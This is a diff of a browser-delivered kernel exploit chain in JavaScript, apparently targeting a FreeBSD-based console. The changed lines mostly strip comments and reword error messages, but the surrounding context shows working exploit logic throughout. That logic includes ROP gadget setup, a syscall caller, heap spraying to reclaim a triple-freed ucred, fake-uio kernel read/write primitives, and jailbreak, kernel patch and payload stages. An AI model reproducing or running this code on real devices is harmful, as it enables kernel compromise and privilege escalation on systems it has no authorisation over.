@@ -11,9 +11,6 @@ let passCount = 0, failCount = 0;
 const params = new URLSearchParams(location.search);
 const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
-// ============================================================
-// AJUSTES
-// ============================================================
 const CFG_IOV_WORKERS   = 1;
 const CFG_UIO_WORKERS   = 1;
 const CFG_ATTEMPTS      = 4;
@@ -26,7 +23,6 @@ const CFG_DO_JAILBREAK  = 1;
 const CFG_DO_KPATCH     = 1;
 const CFG_DO_PAYLOAD    = 1;
 const CFG_KARW_MAX_ATTEMPTS = 4;
-// ============================================================
 
 const TM = window.__TM = window.__TM || { startedAt: Date.now(), errors: [], stages: {}, diagnostics: {} };
 function tmStage(tag, detail) {
@@ -150,7 +146,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
     try {
         const NUM_IOV_WORKER = CFG_IOV_WORKERS;
         const NUM_ATTEMPT = CFG_ATTEMPTS;
-        const NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x200;
         const MS_DELAY = CFG_MSDELAY;
 
         mark("SYS-TABLE", "entries=" + SYS_NAMES.length);
@@ -298,7 +293,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             c.stackU8.fill(0); c.frameU8.fill(0);
             const insts = [];
             for (let i = 0; i < args.length; ++i) {
-                if (!argGadget[i] || typeof argGadget[i].low !== "number") throw new Error("layout: arg[" + i + "]");
+                if (!argGadget[i] || typeof argGadget[i].low !== "number") throw new Error("layout arg " + i);
                 insts.push(argGadget[i]); insts.push(args[i]);
             }
             const targetIdx = insts.length;
@@ -325,10 +320,10 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         mainArmed = true;
 
         function callAddr(target, args) {
-            if (!target || typeof target.low !== "number") throw new Error("callAddr: bad target");
+            if (!target || typeof target.low !== "number") throw new Error("callAddr bad target");
             layout(M, target, args);
             const saved = p.read8(pivotCell);
-            if (!saved || typeof saved.low !== "number") throw new Error("callAddr: read8(pivotCell)");
+            if (!saved || typeof saved.low !== "number") throw new Error("callAddr read8 pivot");
             p.write8(pivotCell, M.S);
             Math.expm1(pivotObj);
             p.write8(pivotCell, saved);
@@ -336,9 +331,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         }
         sc = function (num) {
             const a = Array.prototype.slice.call(arguments, 1);
-            if (typeof num !== "number") throw new Error("sc: num=" + num);
+            if (typeof num !== "number") throw new Error("sc num=" + num);
             const stub = stubAddr.get(num);
-            if (!stub) throw new Error("sc: no stub " + num);
+            if (!stub) throw new Error("sc no stub " + num);
             return callAddr(stub, a);
         };
         function errno() {
@@ -416,8 +411,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
         const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
 
-        // Sin setsockopt grandes (evita fragmentar el heap del kernel)
-        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",") + " (sin setsockopt)");
+        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",") + " sin setsockopt");
 
         if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
         const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -481,10 +475,10 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 const arr = await w.rpc("init", 5000, sLo, sHi);
                 keepAlive.push(arr);
                 const D = bufAddr(arr.buffer);
-                if ((p.read4(D) >>> 0) !== sLo) throw new Error(name + ": transfer failed");
+                if ((p.read4(D) >>> 0) !== sLo) throw new Error(name + " transfer failed");
                 const storage = p.read8(D.add32(0x10));
                 const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
-                if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
+                if (!mc || !ptrish(mc)) throw new Error(name + " walk failed");
                 const bf = p.read8(mc.add32(8));
                 let wm = null, wv = null, wl = null;
                 for (let k = 1; k <= 8; ++k) {
@@ -496,7 +490,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                     else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
                 }
-                if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
+                if (!(wm && wv && wl)) throw new Error(name + " shapes not found");
                 w.master = wm; w.origVector = p.read8(wm.add32(0x10));
                 p.write8(wm.add32(0x10), wv); w.wired = true;
                 await w.rpc("setup", 5000, wl.low, wl.hi);
@@ -664,7 +658,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     return t;
                 }
                 const tasks = new Array(iovWorkers.length);
-                for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
+                for (let i = 0; i < 0x200 && !reclaimed; ++i) {
                     rounds = i + 1;
                     for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                     sc(SYS.sched_yield);
@@ -708,9 +702,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         check("ucred-triple-freed", !!triplets, triplets ? triplets.join(",") : "");
         if (!triplets) { state("Sin triple free", "bad"); return; }
 
-        // ============================================================
-        // UTILIDADES kread/kwrite
-        // ============================================================
         function fakeUio(uioIov, resid, rw) {
             new Uint8Array(iovAb).fill(0);
             put(iovDv, 0x00, uioIov);
@@ -793,6 +784,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         const kAligned = v => !!v && ((v.low >>> 0) & 7) === 0;
         function kaddrOk(v) { return isKptr(v) && kAligned(v); }
         const qw = (dv, o) => new int64(dv.getUint32(o, true), dv.getUint32(o + 4, true));
+        const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
 
         async function kreadSlow(addr, size, pairs) {
             if (kreadPoisoned) return null;
@@ -866,11 +858,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             for (let t = 0; t < KREAD_TRIES; ++t) { const dv = await kreadSlow(null, total, pairs); if (dv) return dv; if (kreadPoisoned || !tripletsUsable()) break; }
             return null;
         }
-        const kptr = v => v && (v.hi >>> 0) >= 0xffff0000;
 
-        // ============================================================
-        // LOOP DE make_karw CON REINTENTOS
-        // ============================================================
         let kernelBase = null, kqFdp = null, kv = null, karwAttempt = 0;
 
         if (CFG_DO_MAKE_KARW === 1 && off.k_kl_lock && off.k_kl_lock !== 0) {
@@ -1048,14 +1036,10 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
 
         if (!kv) {
             mark("MAKE-KARW-ABORTED", "todos los intentos fallaron");
-            mark("PROOF-SUMMARY-FINAL", "pass=" + passCount + " fail=" + failCount);
             state("make_karw falló", "bad");
             return;
         }
 
-        // ============================================================
-        // JAILBREAK + KPATCH + PAYLOAD (usando kv)
-        // ============================================================
         const kvwAb = new ArrayBuffer(0x10); keepAlive.push(kvwAb);
         const kvwAddr = bufAddr(kvwAb), kvwDv = new DataView(kvwAb);
         function kview(base) {
@@ -1069,7 +1053,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         }
         const fdtOfiles = await kread8(kqFdp);
 
-        // Jailbreak
         let jailbroken = false, curproc = null;
         if (CFG_DO_JAILBREAK === 1) try {
             const FIOSETOWN = 0x8004667c;
@@ -1123,7 +1106,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             }
         } catch (jbe) { mark("JAILBREAK-THREW", jbe.message || String(jbe)); }
 
-        // Kpatch
         let kpatched = false;
         if (CFG_DO_KPATCH === 1 && jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) try {
             state("kpatch...", "warn");
@@ -1171,7 +1153,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             }
         } catch (kpe) { mark("KPATCH-THREW", kpe.message || String(kpe)); }
 
-        // Payload
         let payloadRunning = false, aiofixRan = false;
         if (CFG_DO_PAYLOAD === 1 && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {
             if (aiofix && aiofix.length > 0) {
